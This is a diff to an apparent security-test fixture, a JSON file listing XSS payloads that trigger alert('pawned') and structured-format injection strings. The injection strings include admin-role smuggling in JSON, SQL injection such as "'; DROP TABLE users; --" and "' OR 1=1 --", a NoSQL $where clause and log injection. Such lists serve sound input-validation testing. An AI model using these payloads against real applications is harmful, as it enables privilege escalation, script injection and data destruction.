@@ -1,9 +1,28 @@
 {
-  "DOMInjection":[
+  "DOMInjection": [
     "</script><script>alert('pawned');</script>",
-    "<img src=0 onerror=\"alert('pawned')\" /\\>",
+    "<img src=0 onerror=\"alert('pawned')\" />",
     "\\u003C\\u002Fscript\\u003E\\u003Cscript\\u003Ealert('pawned');\\u003C\\u002Fscript\\u003E",
-    "\\u003Cimg src=0 onerror='alert(`pawned`)'\\u003E"
+    "\\u003Cimg src=0 onerror='alert(`pawned`)'\\u003E",
+    "<svg/onload=alert('pawned')>",
+    "<iframe src='javascript:alert(\"pawned\")'></iframe>",
+    "<a href='javascript:alert(\"pawned\")'>Click Me</a>",
+    "<input type='text' value='<script>alert(\"pawned\")</script>'>",
+    "<body onload=alert('pawned')>",
+    "<embed src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ3Bhd25lZCcpPjwvc3ZnPg==' />",
+    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"pawned\")'>",
+    "<object data='javascript:alert(\"pawned\")'></object>"
   ],
-  "StructuredFormatInjection": {"name":"Dana\",\"role\":\"admin"}
+  "StructuredFormatInjection": {
+    "name": "Dana\",\"role\":\"admin",
+    "username": "test\",\"isAdmin\":true,\"privileges\":[\"ALL\"]",
+    "metadata": "{\"isAdmin\": true, \"role\": \"superuser\"}",
+    "user": "{ \"id\": \"123\", \"role\": \"admin\", \"access\": \"full\" }",
+    "input": "\"; DROP TABLE users; --",
+    "jsonInjection": "{\"user\": {\"name\": \"attacker\", \"admin\": \"true\"}}",
+    "xmlInjection": "<user><name>test</name><role>admin</role></user>",
+    "sqlInjection": "' OR 1=1 --",
+    "nosqlInjection": "{ \"$where\": \"this.role == 'admin'\" }",
+    "logInjection": "LOG=ALERT('pawned');"
+  }
 }
